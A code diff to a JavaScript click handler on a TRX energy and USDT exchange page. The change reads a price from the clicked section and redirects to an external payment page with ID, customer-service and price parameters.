@@ -499,10 +499,31 @@
 				const tgid = params.get('tgid') || '5866891166'
 				const kefu = params.get('kefu') || 'okk13'
 
-				const payParams = new URLSearchParams(window.location.search)
+				let price = '0'
+				const event = window.event
+				if (event && event.target) {
+					const target = event.target
+					if (target.closest('#energyRental')) {
+						const priceInfo = document.getElementById('price')
+						if (priceInfo) price = priceInfo.innerText
+					} else if (target.closest('#exchange')) {
+						const input = document.getElementById('exchangeInput1')
+						if (input) price = input.value
+					} else if (target.closest('#prestore')) {
+						const input = document.getElementById('calculatorInput')
+						if (input) price = input.value
+					}
+				}
+
+				// 如果未获取到价格，尝试默认获取第一个
+				if ((!price || price === '0') && document.getElementById('price')) {
+					price = document.getElementById('price').innerText
+				}
+
+				const payParams = new URLSearchParams()
 				payParams.set('tgid', tgid)
 				payParams.set('kefu', kefu)
-				payParams.set('title', 'TRX能量/U兑换服务')
+				payParams.set('vip', price)
 
 				window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
 			}
